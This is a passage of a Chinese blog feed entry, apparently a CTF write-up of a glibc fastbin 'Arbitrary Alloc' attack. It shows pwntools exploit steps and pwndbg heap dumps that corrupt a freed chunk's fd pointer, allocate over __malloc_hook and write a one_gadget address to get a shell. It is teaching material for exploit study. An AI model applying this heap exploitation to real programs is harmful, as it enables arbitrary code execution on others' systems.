class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4(由unsortedbin分裂)</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5(由unsortedbin分裂)</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6（原index5）</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的堆情况可以看到，由于是malloc(0x60)，而原unsortedbin中的chunk_size过大，因此unsortedbin中的chunk会利用并分裂成两个堆块，其中index5还是存放在unsortedbin中的：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x5555557570f0</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x5555557570f0</span><br>BK: <span class="hljs-number">0x5555557570f0</span> ◂— <span class="hljs-number">0x90</span><br>----------------------------------------------------------------------<br>执行payload前：<br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x555555757080</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x555555757080</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x555555757080</span><br>----------------------------------------------------------------------<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-2-free-index4"><a href="#2-2-free-index4" class="headerlink" title="2-2 free(index4)"></a>2-2 free(index4)</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#index2_content指针还是指向index4_chunk_data</span><br><span class="hljs-comment">#为了修改之后index4的fd指针，因此我们可以先释放index4</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x555555757080</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin （这里显示不准确）<br><span class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x71</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x5555557570d0</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x5555557570f0</span><br>Size: <span class="hljs-number">0x90</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757180</span><br>Size: <span class="hljs-number">0x20e61</span><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4（fastbin）</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5（unsortedbin）</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#（此处发生了改变）     #index6（原index5）</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure><h4 id="2-3-修改index4的fd指针"><a href="#2-3-修改index4的fd指针" class="headerlink" title="2-3 修改index4的fd指针"></a>2-3 修改index4的fd指针</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="hljs-comment">#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小</span><br><span class="hljs-comment">#这个地址是main_arena-0x40+0xd,具体看后面图片解释</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4（fastbin）</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x00007ffff7dd1aed</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#更改index4的fd指针</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5（unsortedbin）</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/16gx <span class="hljs-number">0x00007ffff7dd1aed</span><br><span class="hljs-number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:<span class="hljs-number">0xfff7dd0260000000</span><span class="hljs-number">0x000000000000007f</span><br><span class="hljs-number">0x7ffff7dd1afd</span>:<span class="hljs-number">0xfff7a92ea0000000</span><span class="hljs-number">0xfff7a92a7000007f</span><br><span class="hljs-number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:<span class="hljs-number">0x000000000000007f</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b1d</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="hljs-number">13</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="hljs-number">29</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="hljs-number">45</span>&gt;:<span class="hljs-number">0x5555757080000000</span><span class="hljs-number">0x0000000000000055</span><br><span class="hljs-number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="hljs-number">61</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-4-控制-malloc-hook"><a href="#2-4-控制-malloc-hook" class="headerlink" title="2-4 控制__malloc_hook"></a>2-4 控制__malloc_hook</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index7</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000060</span><br>                <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#（此处发生了改变）     #index6（原index5）</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br><span class="hljs-number">0x5fcead987c0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000060</span><br>    <span class="hljs-comment">#index7</span><br><span class="hljs-number">0x5fcead987d0</span>:<span class="hljs-number">0x00007ffff7dd1afd</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-5-写入-one-gadget-并-getshell"><a href="#2-5-写入-one-gadget-并-getshell" class="headerlink" title="2-5 写入 one_gadget 并 getshell"></a>2-5 写入 one_gadget 并 getshell</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后往malloc_hook上写one_gadget的地址</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br>gdb.attach(p)<br></code></pre></td></tr></tbody></table></figure><h4 id="2-6-最后申请一个chunk"><a href="#2-6-最后申请一个chunk" class="headerlink" title="2-6 最后申请一个chunk"></a>2-6 最后申请一个chunk</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure><p>最后就能get shell 了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fastbin-attack中的Arbitrary-Alloc（例题）&quot;&gt;&lt;a href=&quot;#fastbin-attack中的Arbitrary-Alloc（例题）&quot; class=&quot;headerlink&quot; title=&quot;fastbin_attack中的Arbitr</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="fastbin attack" scheme="https://kylinxin.github.io/tags/fastbin-attack/"/>
    
  </entry>
  
</feed>
